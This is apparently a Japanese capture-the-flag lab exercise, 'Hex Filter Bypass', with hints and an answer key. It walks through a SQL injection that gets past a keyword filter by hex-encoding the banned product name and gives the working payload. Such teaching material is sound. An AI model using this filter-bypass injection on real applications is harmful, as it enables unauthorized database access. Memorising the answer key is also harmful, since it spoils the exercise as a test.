# 05 - Hex Filter Bypass

`http://localhost:3005`で、禁止された商品`Vault`の説明欄にあるflagを表示せよ。

検索欄へ`Vault`と入力するとフィルタに拒否される。MySQLでは文字列を文字コードの
16進数表現でも比較できる。

## ヒント

<details><summary>ヒント1</summary>

検索SQLは次の形になっている。

```sql
SELECT id, name, description FROM products WHERE name = '入力値'
```

シングルクォートを入力すれば、文字列を途中で閉じられる。

</details>

<details><summary>ヒント2</summary>

`Vault`をUTF-8の16進数へ変換すると`56 61 75 6c 74`になる。MySQLでは先頭に`0x`を付けた
`0x5661756c74`を文字列`Vault`として比較できる。payloadには禁止語の文字が含まれない。

</details>

<details><summary>解答</summary>

検索欄へ次を入力する。

```
zzz' OR name=0x5661756c74#
```

実行されるSQL:

```sql
SELECT id, name, description FROM products
WHERE name = 'zzz' OR name=0x5661756c74#'
```

- `zzz'`で最初の文字列を閉じる
- `name=0x5661756c74`で、商品名が`Vault`と等しいか比較する
- `#`で最後に残ったシングルクォートをコメントアウトする

フィルタが探す`Vault`という文字は入力に含まれないが、MySQLは16進数を同じ文字列として
扱うため、Vault商品の説明欄にflagが表示される。

</details>
